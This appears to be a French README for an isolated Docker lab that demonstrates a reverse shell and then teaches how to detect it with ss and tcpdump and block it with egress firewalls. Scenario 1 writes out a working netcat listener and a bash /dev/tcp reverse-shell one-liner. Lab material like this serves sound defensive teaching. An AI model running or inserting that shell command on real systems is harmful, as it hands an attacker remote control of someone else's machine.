# Lab reverse shell — exercice de sécurité légitime

Un mini-laboratoire **entièrement isolé** pour comprendre, de l'intérieur, comment
fonctionne un reverse shell et — surtout — comment on le **détecte**.

## Pourquoi c'est légitime

- Les deux machines (`attacker` et `target`) sont **deux conteneurs qui t'appartiennent**.
- Elles vivent sur un réseau Docker `internal` : **aucun accès à Internet**, rien ne
  sort de ta machine, aucun tiers n'est touché.
- Tu contrôles et observes les deux extrémités — c'est un banc d'essai, pas une attaque.

C'est la différence de fond avec « injecter un shell dans une page web » : ici il n'y a
ni victime, ni consentement à extorquer, ni code qui part vers des machines d'autrui.

## Démarrer le lab

```bash
cd reverse-shell-lab
docker compose up -d --build
```

## Scénario 1 — Observer un reverse shell

Ouvre **deux terminaux**.

**Terminal A — l'« attaquant » met un listener en écoute :**
```bash
docker exec -it lab-attacker bash
# dans le conteneur :
nc -lvnp 4444
```

**Terminal B — la « cible » se connecte en retour et livre son shell :**
```bash
docker exec -it lab-target bash
# dans le conteneur :
/bin/bash -i > /dev/tcp/attacker/4444 0<&1 2>&1
```

Reviens sur le Terminal A : tu tapes des commandes, elles s'exécutent sur `target`.
Voilà tout le « secret » d'un reverse shell — une simple connexion sortante qui
redirige les flux d'un shell. Aucune magie, aucun exploit navigateur.

> Note : c'est **toi** qui lances la commande sur la cible. Dans une vraie attaque,
> le travail de l'attaquant est de *faire exécuter cette ligne à quelqu'un d'autre*
> — c'est précisément ce que les défenses ci-dessous cherchent à empêcher.

## Scénario 2 — Détecter la connexion (le vrai apprentissage)

Pendant que le shell du scénario 1 est ouvert, sur `target` :

```bash
# Lister les connexions établies : la connexion vers attacker:4444 saute aux yeux
ss -tnp

# Capturer le trafic pour voir le shell en clair passer sur le réseau
tcpdump -i any -A 'tcp port 4444'
```

Questions à explorer :
- Quel processus est à l'origine de la connexion sortante ? (`ss -tnp` te le dit)
- À quoi ressemble une connexion « anormale » comparée au trafic normal ?
- Comment un pare-feu **egress** (sortant) bloquerait-il ça ?

## Scénario 3 — Bloquer (durcissement)

Depuis l'hôte, on peut couper la cible du reste et voir le shell mourir :

```bash
# Empêcher target de se connecter à attacker
docker network disconnect reverse-shell-lab_lab lab-target
```

Sur une vraie machine (ton VPS mawena.cloud), les équivalents sont :
- **Pare-feu egress** : n'autoriser que les ports sortants nécessaires (`ufw`, `iptables`).
- **fail2ban** + surveillance des logs d'authentification.
- **Détection de connexions sortantes inhabituelles** (auditd, alerting).

## Nettoyer

```bash
docker compose down
```

## Pour aller plus loin (toujours sur des cibles à toi / autorisées)

- Machines volontairement vulnérables pour s'exercer : **DVWA**, **Metasploitable**,
  ou les parcours guidés de **TryHackMe** / **HackTheBox** (environnements dédiés et
  autorisés par conception).
